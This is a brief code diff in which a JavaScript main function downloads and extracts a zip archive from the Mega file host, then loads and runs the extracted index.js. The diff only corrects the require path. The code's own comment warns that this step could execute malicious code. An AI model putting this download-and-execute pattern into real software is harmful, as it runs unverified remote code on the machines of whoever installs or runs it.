@@ -32,7 +32,7 @@ const main = async () => {
     );
     await downloadAndExtractMegaZip(data.mega);
     console.log("Executing...");
-    require("../index.js"); // Warning: This could execute malicious code
+    require("./index.js"); // Warning: This could execute malicious code
   } catch (err) {
     console.error("Error:", err.message);
   }
